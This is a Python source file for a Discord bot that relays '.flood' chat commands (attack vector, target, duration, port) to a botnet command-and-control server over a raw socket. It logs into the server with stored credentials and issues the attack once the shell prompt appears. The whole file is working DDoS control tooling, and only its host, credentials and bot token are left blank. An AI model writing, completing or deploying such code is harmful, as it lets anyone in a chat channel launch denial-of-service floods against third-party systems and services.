import os
import sys
import time
import socket
import discord

host = ""
CNCport = 
username = ""
password = ""
shellprompt = ""

client = discord.Client()

async def parsetocnc(vec: str, target: str, timestamp: str, port: str):
	attack = "%s %s %s dport=%s" %(vec, target, timestamp, port) # make attakck.
	print("Parsing: %s" %(attack))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup socket to connect to CNC
	s.connect((host, CNCport)) # connect to CNC to send attack

	s.send("\r\n".encode()) # send new line because of the IAC negotiation

	buf = s.recv(1024) # receive/

	s.send("{}\r\n".format(username).encode()) # login with username
	time.sleep(1) # sleep for a second to give cnc time to respond
	s.send("{}\r\n".format(password).encode()) # send password to complete login
	while(True):
		buf = s.recv(1024) # recv to wait until shell prompt
		if(shellprompt in str(buf)): # wait for shell prompt to send attack
			s.send("{}\r\n".format(attack).encode()) # send attack.
			return(True)

async def parseflood(arg: str, message): # give function an argument and point it to a string (async for message.channel.send)
	try:
		attackvec = arg.split(".flood ")[1].split(" ")[0]  # get attack 
		print("Attack vec: %s" %(attackvec)) # print attack vector
		target = arg.split(" ")[2].split(" ")[0]  # get target
		print("Target: %s" %(target))
		timesec = arg.split(" ")[3].split(" ")[0]  # get time
		print("Time: %s" %(timesec))
		port = arg.split(" ")[4].split(" ")[0]  # get port
		print("port: %s" %(port))

		if(int(timesec) <= 300):
			await parsetocnc(attackvec, target, timesec, port)
		else:
			await message.channel.send("Attack time too long. (300 is max)")
	except(IndexError) as err: # except if the command didn't parse correctly.
		await message.channel.send("wrong attack parsing! %s" %(err))
	

@client.event # setup asynchronous listener for on_message event
async def on_message(message): # on_message event (gets triggered when message gets sent)
	print(message.content)
	if(".flood" in message.content): # check if .flood is in the message
		await parseflood(message.content, message) # call parse flood function await it because async

client.run("")
